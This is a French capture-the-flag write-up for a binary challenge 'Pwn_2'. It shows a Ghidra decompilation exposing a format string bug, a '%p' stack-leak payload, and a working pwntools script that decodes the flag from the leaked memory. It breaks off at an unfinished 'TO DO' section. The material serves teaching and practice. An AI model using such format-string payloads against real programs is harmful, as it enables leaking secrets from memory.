# Pwn_2

```console
$ ./pwn_2 
Segmentation fault (core dumped)
```

Le programme ne semble pas fonctionner, analysons le avec Ghidra.

## Analyse statique

Avec Ghidra nous obtenons :

```C
undefined8 main(void)
{
  char file_content [64];
  char user_input [56];
  FILE *fd;
  
  fd = fopen("flag.txt","r");
  fgets(file_content,49,fd);
  puts(&DAT_00402278);
  fgets(user_input,49,stdin);
  puts(&DAT_004022e8);
  printf(user_input);
  return 0;
}
```

Le programme ouvre le contenu du fichier `flag.txt`, pour le lancer localement il faudra en créer un :

```console
$ echo "coucou" > flag.txt

$ ./pwn_2 
Oh, tu te crois malin ? Vas-y envoie-moi un payload, ça ne marchera pas ! Mes défenses sont impénétrables.
test
Tu vois à quel point tes tentatives sont inutiles ?
test
```

Cette fois-ci pas de buffer overflow mais un [format string](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) : `printf(user_input);`.

Le programme ouvre aussi un fichier `flag.txt` sans en afficher le contenu. Essayons d'en exfiltere le contenu avec le format string.

## Analyse dynamique

On crée un faux flag :

```console
$ echo "SSI{TESTING_THIS}" > flag.txt
```

Le programme prend un input de 49 bytes : `fgets(user_input,49,stdin);`. Utilisons le format string pour afficher autant de bytes de le stack que possible :

```python
>>> "%p."*(49//3)
'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.'
```

```console
$ cp ~/Documents/LABOC./pwn_2 
Oh, tu te crois malin ? Vas-y envoie-moi un payload, ça ne marchera pas ! Mes défenses sont impénétrables.
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Tu vois à quel point tes tentatives sont inutiles ?
0x4c01490.(nil).0x7f261c880504.(nil).0x1.0x545345547b495353.0x534948545f474e49.0xa7d.0x7ffceb8cdb28.0x9e00000006.(nil).(nil).(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
```

Pour cette étape nous pouvons aller voir dans GDB pour y voir plus claire, mais nous pouvons aussi repérer cette suite hexadécimale qui ressemble de l'ASCII :

```
0x545345547b495353.0x534948545f474e49.0xa7d
```

```python3
>>> (len("0x545345547b495353")-2)//2
8
>>> 0x545345547b495353.to_bytes(8, 'little')
b'SSI{TEST'
```

Il s'agit donc bien du début du flag que nous avons mis dans `flag.txt`.

## Exploit

```python
from pwn import *
import math

payload = b"%p."*(50//3)

p = process("./pwn_2")
p.send(payload+b"\n")
data = p.recv()
data = data.split(b"\n")[-1].split(b".")[5:]

flag = b""
for i in data:
    if i != b"":
        flag += int(i, 16).to_bytes(math.ceil((len(i)-2)/2), 'little')
    if b"}" in flag:
        print(f"Flag : {flag}")
        p.close()
        exit()
p.close()
```

```console
$ python3 solve.py 
[+] Starting local process './pwn_2': pid 54497
[*] Process './pwn_2' stopped with exit code 0 (pid 54497)
Flag : b'SSI{TESTING_THIS}\n'
```

Plus qu'à lancer sur le serveur :

## TO DO
